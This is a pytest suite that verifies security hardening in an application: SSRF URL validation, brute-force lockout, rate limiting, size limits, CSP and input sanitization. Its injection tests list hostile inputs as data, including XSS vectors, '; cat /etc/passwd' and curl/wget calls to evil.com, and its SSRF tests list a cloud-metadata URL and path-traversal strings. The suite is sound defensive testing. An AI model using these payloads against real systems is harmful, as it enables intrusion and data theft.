"""
Hardening QC Round 2 — Comprehensive Security Hardening Verification
=====================================================================

Tests all hardening improvements applied in Round 2:

 1. SSRF protection in WebhookDispatcher (CWE-918)
 2. Rate limiter TTL-based cleanup (CWE-400)
 3. Brute-force protection (CWE-307) — security_hardening_config + fastapi_security
 4. Request body size limits (CWE-400)
 5. Expanded XSS/injection patterns in InputSanitizer (CWE-79)
 6. Null byte stripping in sanitize_string (CWE-158)
 7. CSP unsafe-inline removal (CWE-79)
 8. Conversation manager ID validation + metadata sanitization
 9. Webhook HTTPS enforcement in production
10. Integration smoke tests

Each test class targets a specific CWE or hardening control.
"""

import os
import time

import pytest

# ---------------------------------------------------------------------------
# Ensure test environment
# ---------------------------------------------------------------------------
os.environ.setdefault("MURPHY_ENV", "test")

# ---------------------------------------------------------------------------
# Imports — production modules under test
# ---------------------------------------------------------------------------
from conversation_manager import ConversationManager
from security_hardening_config import (
    BruteForceProtection,
    ContentSecurityPolicy,
    InputSanitizer,
    RateLimiter,
    RequestSizeLimiter,
    SecurityHardeningConfig,
)
from webhook_dispatcher import WebhookDispatcher

# ===================================================================== #
#  1. SSRF Protection — WebhookDispatcher (CWE-918)                      #
# ===================================================================== #


class TestSSRFProtection:
    """Validate that webhook URL registration blocks private/reserved IPs."""

    def test_blocks_loopback_ipv4(self):
        """127.0.0.1 must be rejected."""
        with pytest.raises(ValueError, match="private/reserved"):
            WebhookDispatcher.validate_webhook_url("https://127.0.0.1/hook")

    def test_blocks_loopback_ipv6(self):
        """::1 must be rejected."""
        with pytest.raises(ValueError, match="private/reserved"):
            WebhookDispatcher.validate_webhook_url("https://[::1]/hook")

    def test_blocks_private_10_network(self):
        """10.x.x.x must be rejected."""
        with pytest.raises(ValueError, match="private/reserved"):
            WebhookDispatcher.validate_webhook_url("https://10.0.0.1/webhook")

    def test_blocks_private_172_network(self):
        """172.16.x.x must be rejected."""
        with pytest.raises(ValueError, match="private/reserved"):
            WebhookDispatcher.validate_webhook_url("https://172.16.0.1/webhook")

    def test_blocks_private_192_168(self):
        """192.168.x.x must be rejected."""
        with pytest.raises(ValueError, match="private/reserved"):
            WebhookDispatcher.validate_webhook_url("https://192.168.1.1/webhook")

    def test_blocks_link_local(self):
        """169.254.x.x (link-local) must be rejected."""
        with pytest.raises(ValueError, match="private/reserved"):
            WebhookDispatcher.validate_webhook_url("https://169.254.169.254/latest/meta-data")

    def test_blocks_zero_network(self):
        """0.0.0.0 must be rejected."""
        with pytest.raises(ValueError, match="private/reserved"):
            WebhookDispatcher.validate_webhook_url("https://0.0.0.0/hook")

    def test_allows_public_ip(self):
        """Public IPs must be allowed."""
        WebhookDispatcher.validate_webhook_url("https://93.184.216.34/webhook")

    def test_allows_public_hostname(self):
        """Public hostnames must be allowed."""
        WebhookDispatcher.validate_webhook_url("https://example.com/webhook")

    def test_blocks_ftp_scheme(self):
        """Non-http(s) schemes must be rejected."""
        with pytest.raises(ValueError, match="scheme must be"):
            WebhookDispatcher.validate_webhook_url("ftp://example.com/file")

    def test_blocks_file_scheme(self):
        """file:// scheme must be rejected."""
        with pytest.raises(ValueError, match="scheme must be"):
            WebhookDispatcher.validate_webhook_url("file:///etc/passwd")

    def test_blocks_empty_url(self):
        """Empty URL must be rejected."""
        with pytest.raises(ValueError, match="required"):
            WebhookDispatcher.validate_webhook_url("")

    def test_blocks_restricted_ports(self):
        """Known internal-service ports must be rejected."""
        for port in (22, 25, 53, 6379, 5432, 3306, 11211):
            with pytest.raises(ValueError, match="restricted port"):
                WebhookDispatcher.validate_webhook_url(f"https://example.com:{port}/hook")

    def test_allows_standard_https_port(self):
        """Standard HTTPS port 443 must be allowed."""
        WebhookDispatcher.validate_webhook_url("https://example.com:443/webhook")

    def test_register_subscription_validates_url(self):
        """register_subscription must reject private IPs."""
        d = WebhookDispatcher()
        with pytest.raises(ValueError, match="private/reserved"):
            d.register_subscription(
                name="evil", url="https://10.0.0.1/steal", event_types=["*"]
            )

    def test_update_subscription_validates_url(self):
        """update_subscription must reject private IPs on URL change."""
        d = WebhookDispatcher()
        sub = d.register_subscription(
            name="ok", url="https://example.com/hook", event_types=["*"]
        )
        with pytest.raises(ValueError, match="private/reserved"):
            d.update_subscription(sub.id, url="https://192.168.0.1/evil")

    def test_https_enforced_in_production(self):
        """HTTP must be rejected in production mode."""
        old_env = os.environ.get("MURPHY_ENV")
        os.environ["MURPHY_ENV"] = "production"
        try:
            with pytest.raises(ValueError, match="HTTPS"):
                WebhookDispatcher.validate_webhook_url("http://example.com/webhook")
        finally:
            if old_env is not None:
                os.environ["MURPHY_ENV"] = old_env
            else:
                os.environ.pop("MURPHY_ENV", None)

    def test_http_allowed_in_development(self):
        """HTTP should be allowed in development."""
        old_env = os.environ.get("MURPHY_ENV")
        os.environ["MURPHY_ENV"] = "development"
        try:
            WebhookDispatcher.validate_webhook_url("http://example.com/webhook")
        finally:
            if old_env is not None:
                os.environ["MURPHY_ENV"] = old_env
            else:
                os.environ.pop("MURPHY_ENV", None)


# ===================================================================== #
#  2. Rate Limiter TTL-based Cleanup (CWE-400)                           #
# ===================================================================== #


class TestRateLimiterCleanup:
    """Verify that in-memory RateLimiter evicts stale buckets."""

    def test_stale_buckets_evicted(self):
        """Buckets inactive beyond TTL are removed during cleanup."""
        rl = RateLimiter(requests_per_minute=60, burst_size=10)
        # Generate traffic from a client
        rl.check("stale-client")
        assert rl._buckets.get("stale-client") is not None

        # Simulate time passing beyond TTL
        for b in rl._buckets.values():
            b["last_refill"] -= (rl._BUCKET_TTL_SECONDS + 1)

        # Force cleanup by advancing _last_cleanup
        rl._last_cleanup -= (rl._CLEANUP_INTERVAL + 1)
        rl.check("new-client")  # triggers cleanup

        assert "stale-client" not in rl._buckets
        assert "new-client" in rl._buckets

    def test_active_buckets_preserved(self):
        """Recent buckets must not be evicted."""
        rl = RateLimiter(requests_per_minute=60, burst_size=10)
        rl.check("active-client")
        rl._last_cleanup -= (rl._CLEANUP_INTERVAL + 1)
        rl._evict_stale_buckets(time.monotonic())
        assert "active-client" in rl._buckets

    def test_max_buckets_cap(self):
        """New clients should still be tracked even at max capacity (cleanup runs)."""
        rl = RateLimiter(requests_per_minute=60, burst_size=10)
        rl._MAX_BUCKETS = 5
        for i in range(5):
            rl.check(f"client-{i}")
        assert len(rl._buckets) == 5
        # This should trigger cleanup then add new client
        rl.check("client-new")
        assert "client-new" in rl._buckets


# ===================================================================== #
#  3. Brute-Force Protection (CWE-307)                                   #
# ===================================================================== #


class TestBruteForceProtection:
    """Verify brute-force lockout after repeated failures."""

    def test_lockout_after_max_attempts(self):
        """Client is locked out after max_attempts failures."""
        bf = BruteForceProtection(max_attempts=3, window_seconds=60, lockout_seconds=60)
        for _ in range(2):
            result = bf.record_failure("bad-actor")
            assert not result["locked_out"]
        result = bf.record_failure("bad-actor")
        assert result["locked_out"]

    def test_is_locked_out_true(self):
        """is_locked_out returns True for locked client."""
        bf = BruteForceProtection(max_attempts=2, window_seconds=60, lockout_seconds=60)
        bf.record_failure("actor-1")
        bf.record_failure("actor-1")
        assert bf.is_locked_out("actor-1")

    def test_is_locked_out_false_initially(self):
        """is_locked_out returns False for unknown client."""
        bf = BruteForceProtection()
        assert not bf.is_locked_out("unknown")

    def test_success_clears_tracking(self):
        """Successful auth clears failure tracking."""
        bf = BruteForceProtection(max_attempts=5, window_seconds=60, lockout_seconds=60)
        bf.record_failure("user-1")
        bf.record_failure("user-1")
        bf.record_success("user-1")
        assert not bf.is_locked_out("user-1")
        # Re-attempt should restart from 0
        result = bf.record_failure("user-1")
        assert result["attempts"] == 1

    def test_lockout_expires(self):
        """Lockout expires after lockout_seconds."""
        bf = BruteForceProtection(max_attempts=2, window_seconds=60, lockout_seconds=1)
        bf.record_failure("expire-test")
        bf.record_failure("expire-test")
        assert bf.is_locked_out("expire-test")
        # Simulate time passing beyond lockout
        for cid in bf._lockouts:
            bf._lockouts[cid] = time.monotonic() - 1
        assert not bf.is_locked_out("expire-test")

    def test_status_reports_lockouts(self):
        """Status dict includes active lockouts count."""
        bf = BruteForceProtection(max_attempts=1, window_seconds=60, lockout_seconds=600)
        bf.record_failure("locked")
        st = bf.status()
        assert st["active_lockouts"] >= 1
        assert st["tracked_clients"] >= 1

    def test_remaining_attempts_decremented(self):
        """Remaining attempts decrements correctly."""
        bf = BruteForceProtection(max_attempts=5, window_seconds=60, lockout_seconds=60)
        r1 = bf.record_failure("counter")
        assert r1["remaining"] == 4
        r2 = bf.record_failure("counter")
        assert r2["remaining"] == 3

    def test_cleanup_purges_expired(self):
        """Cleanup removes expired lockouts and stale records."""
        bf = BruteForceProtection(max_attempts=1, window_seconds=1, lockout_seconds=1)
        bf.record_failure("to-clean")
        assert bf.is_locked_out("to-clean")
        # Expire the lockout
        now = time.monotonic()
        bf._lockouts["to-clean"] = now - 2
        bf._cleanup(now)
        assert "to-clean" not in bf._lockouts


# ===================================================================== #
#  4. Request Body Size Limits (CWE-400)                                 #
# ===================================================================== #


class TestRequestSizeLimiter:
    """Verify request body size enforcement."""

    def test_default_allows_small_body(self):
        rsl = RequestSizeLimiter()
        result = rsl.check(1024, "/api/execute")
        assert result["allowed"]

    def test_default_blocks_oversized_body(self):
        rsl = RequestSizeLimiter(default_max_bytes=1000)
        result = rsl.check(2000, "/api/execute")
        assert not result["allowed"]
        assert result["reason"] == "request_body_too_large"

    def test_upload_uses_higher_limit(self):
        rsl = RequestSizeLimiter(default_max_bytes=1000, upload_max_bytes=5000)
        result = rsl.check(3000, "/api/upload")
        assert result["allowed"]

    def test_none_content_length_allowed(self):
        """Requests without Content-Length header are allowed (streaming)."""
        rsl = RequestSizeLimiter()
        result = rsl.check(None, "/api/execute")
        assert result["allowed"]

    def test_import_path_uses_upload_limit(self):
        rsl = RequestSizeLimiter(default_max_bytes=100, upload_max_bytes=5000)
        result = rsl.check(3000, "/api/import")
        assert result["allowed"]

    def test_status_reports_limits(self):
        rsl = RequestSizeLimiter(default_max_bytes=1000, upload_max_bytes=5000)
        st = rsl.status()
        assert st["default_max_bytes"] == 1000
        assert st["upload_max_bytes"] == 5000


# ===================================================================== #
#  5. Expanded XSS/Injection Patterns (CWE-79)                          #
# ===================================================================== #


class TestExpandedInjectionPatterns:
    """Verify additional XSS vectors are detected."""

    @pytest.mark.parametrize("payload", [
        '<svg onload="alert(1)">',
        '<img src=x onerror="alert(1)">',
        "<iframe src=evil>",
        "<object data=evil>",
        "<embed src=evil>",
        '<body onload="alert(1)">',
        "vbscript:MsgBox",
        "data: text/html,<script>alert(1)</script>",
        "; cat /etc/passwd",
        "; curl http://evil.com",
        "; wget http://evil.com",
    ])
    def test_detects_xss_vector(self, payload):
        """Each XSS vector must trigger at least one injection pattern."""
        threats = InputSanitizer.detect_injection(payload)
        assert len(threats) > 0, f"Failed to detect injection in: {payload}"

    def test_clean_input_no_threats(self):
        """Normal text must not trigger false positives."""
        clean_texts = [
            "Hello, how are you today?",
            "Please generate a report for Q4 2025",
            "The temperature is 72 degrees",
            "Murphy System version 1.0",
        ]
        for text in clean_texts:
            threats = InputSanitizer.detect_injection(text)
            assert len(threats) == 0, f"False positive on: {text}"


# ===================================================================== #
#  6. Null Byte Stripping (CWE-158)                                     #
# ===================================================================== #


class TestNullByteStripping:
    """Verify null bytes are stripped from sanitized strings."""

    def test_strips_embedded_null(self):
        result = InputSanitizer.sanitize_string("hello\x00world")
        assert "\x00" not in result
        assert "helloworld" in result

    def test_strips_leading_null(self):
        result = InputSanitizer.sanitize_string("\x00test")
        assert "\x00" not in result

    def test_strips_trailing_null(self):
        result = InputSanitizer.sanitize_string("test\x00")
        assert "\x00" not in result

    def test_strips_multiple_nulls(self):
        result = InputSanitizer.sanitize_string("\x00\x00test\x00\x00")
        assert "\x00" not in result


# ===================================================================== #
#  7. CSP unsafe-inline Removal (CWE-79)                                #
# ===================================================================== #


class TestCSPHardening:
    """Verify CSP no longer includes unsafe-inline for styles."""

    def test_style_src_no_unsafe_inline(self):
        csp = ContentSecurityPolicy()
        assert "'unsafe-inline'" not in csp.policy.get("style-src", [])

    def test_object_src_none(self):
        """object-src should be 'none' to prevent plugin-based XSS."""
        csp = ContentSecurityPolicy()
        assert "'none'" in csp.policy.get("object-src", [])

    def test_csp_header_string(self):
        csp = ContentSecurityPolicy()
        header = csp.to_header()
        assert "unsafe-inline" not in header
        assert "object-src 'none'" in header

    def test_add_source_works(self):
        """Adding a source to a directive should still work."""
        csp = ContentSecurityPolicy()
        csp.add_source("script-src", "https://cdn.example.com")
        assert "https://cdn.example.com" in csp.policy["script-src"]


# ===================================================================== #
#  8. Conversation Manager Hardening                                     #
# ===================================================================== #


class TestConversationManagerHardening:
    """Verify conversation_id validation and metadata sanitization."""

    def test_valid_conversation_id_accepted(self):
        cm = ConversationManager()
        conv = cm.get_or_create_conversation("test-conv-123")
        assert conv.conversation_id == "test-conv-123"

    def test_empty_conversation_id_rejected(self):
        cm = ConversationManager()
        with pytest.raises(ValueError, match="non-empty"):
            cm.get_or_create_conversation("")

    def test_null_bytes_in_id_stripped(self):
        """Null bytes in conversation_id are stripped (not rejected if result is valid)."""
        cm = ConversationManager()
        conv = cm.get_or_create_conversation("test\x00conv")
        # Null byte is stripped, resulting in "testconv" which is valid
        assert conv.conversation_id == "testconv"

    def test_special_chars_in_id_rejected(self):
        cm = ConversationManager()
        with pytest.raises(ValueError):
            cm.get_or_create_conversation("test<script>alert(1)</script>")

    def test_long_id_rejected(self):
        cm = ConversationManager()
        with pytest.raises(ValueError):
            cm.get_or_create_conversation("a" * 101)

    def test_path_traversal_id_rejected(self):
        cm = ConversationManager()
        with pytest.raises(ValueError):
            cm.get_or_create_conversation("../../etc/passwd")

    def test_message_length_bounded(self):
        """Very long messages should be truncated."""
        cm = ConversationManager()
        long_msg = "A" * 100_000
        cm.add_message("test-conv", long_msg, "response")
        conv = cm.get_or_create_conversation("test-conv")
        last = conv.messages[-1]
        assert len(last.user_message) <= 50_000

    def test_metadata_values_sanitized(self):
        """Metadata string values should be length-bounded."""
        cm = ConversationManager()
        big_meta = {"key": "x" * 20000}
        cm.add_message("meta-test", "hello", "world", metadata=big_meta)
        conv = cm.get_or_create_conversation("meta-test")
        last = conv.messages[-1]
        assert len(last.metadata.get("key", "")) <= 10000

    def test_max_conversations_cap(self):
        """ConversationManager should not grow unbounded."""
        cm = ConversationManager()
        cm._MAX_CONVERSATIONS = 10
        for i in range(15):
            cm.add_message(f"conv-{i}", f"msg-{i}", f"resp-{i}")
        # Should not exceed cap (cleanup runs)
        assert len(cm.conversations) <= 11  # cap + new one being added


# ===================================================================== #
#  9. SecurityHardeningConfig Integration                                #
# ===================================================================== #


class TestSecurityHardeningConfigIntegration:
    """Verify the orchestrator includes all new hardening components."""

    def test_brute_force_in_orchestrator(self):
        config = SecurityHardeningConfig()
        assert hasattr(config, "brute_force")
        assert isinstance(config.brute_force, BruteForceProtection)

    def test_request_size_in_orchestrator(self):
        config = SecurityHardeningConfig()
        assert hasattr(config, "request_size")
        assert isinstance(config.request_size, RequestSizeLimiter)

    def test_status_includes_all_components(self):
        config = SecurityHardeningConfig()
        st = config.status()
        components = st["components"]
        assert "brute_force_protection" in components
        assert "request_size_limiter" in components
        assert "rate_limiter" in components

    def test_locked_out_client_blocked(self):
        """apply_request_security blocks locked-out clients."""
        config = SecurityHardeningConfig()
        # Lock out client by recording failures
        for _ in range(config.brute_force.max_attempts):
            config.brute_force.record_failure("locked-ip")
        result = config.apply_request_security("locked-ip", "", {"msg": "test"})
        assert not result["allowed"]
        assert result["reason"] == "account_locked"

    def test_clean_request_still_passes(self):
        """Clean requests from non-locked clients still pass."""
        config = SecurityHardeningConfig()
        result = config.apply_request_security(
            "clean-ip", "http://localhost:3000", {"message": "hello"}
        )
        assert result["allowed"]


# ===================================================================== #
#  10. FastAPI Brute-Force Integration (structural test)                 #
# ===================================================================== #


class TestFastAPIBruteForceIntegration:
    """Verify brute-force tracker is available in fastapi_security."""

    def test_brute_force_tracker_exists(self):
        from fastapi_security import _brute_force
        assert hasattr(_brute_force, "record_failure")
        assert hasattr(_brute_force, "is_locked_out")
        assert hasattr(_brute_force, "record_success")

    def test_max_body_bytes_configured(self):
        from fastapi_security import _MAX_BODY_BYTES
        assert _MAX_BODY_BYTES > 0

    def test_expanded_injection_patterns(self):
        from fastapi_security import _INJECTION_PATTERNS
        pattern_sources = [p.pattern for p in _INJECTION_PATTERNS]
        # Verify expanded patterns exist
        assert any("iframe" in s for s in pattern_sources)
        assert any("embed" in s for s in pattern_sources)
        assert any("vbscript" in s for s in pattern_sources)


# ===================================================================== #
#  Summary: Hardening Completion Metrics                                 #
# ===================================================================== #


class TestHardeningCompletionMetrics:
    """Meta-test: verify overall hardening coverage."""

    HARDENING_CONTROLS = [
        ("SSRF protection", lambda: hasattr(WebhookDispatcher, "validate_webhook_url")),
        ("Rate limiter cleanup", lambda: hasattr(RateLimiter, "_evict_stale_buckets")),
        ("Brute-force protection", lambda: BruteForceProtection is not None),
        ("Request size limits", lambda: RequestSizeLimiter is not None),
        ("Null byte stripping", lambda: "\x00" not in InputSanitizer.sanitize_string("a\x00b")),
        ("Expanded XSS patterns", lambda: len(InputSanitizer.INJECTION_PATTERNS) > 11),
        ("CSP object-src none", lambda: "'none'" in ContentSecurityPolicy.DEFAULT_POLICY.get("object-src", [])),
        ("CSP no unsafe-inline styles", lambda: "'unsafe-inline'" not in ContentSecurityPolicy.DEFAULT_POLICY.get("style-src", [])),
        ("Conv ID validation", lambda: hasattr(ConversationManager, "_validate_conversation_id")),
        ("Webhook URL validation", lambda: hasattr(WebhookDispatcher, "validate_webhook_url")),
    ]

    def test_all_controls_present(self):
        """Every hardening control must be verified present."""
        results = []
        for name, check in self.HARDENING_CONTROLS:
            try:
                passed = check()
            except Exception:
                passed = False
            results.append((name, passed))

        total = len(results)
        passed = sum(1 for _, ok in results if ok)
        pct = round(passed / total * 100)
        failed = [(n, ok) for n, ok in results if not ok]

        assert passed == total, (
            f"Hardening completion: {pct}% ({passed}/{total}). "
            f"Failed: {[n for n, _ in failed]}"
        )
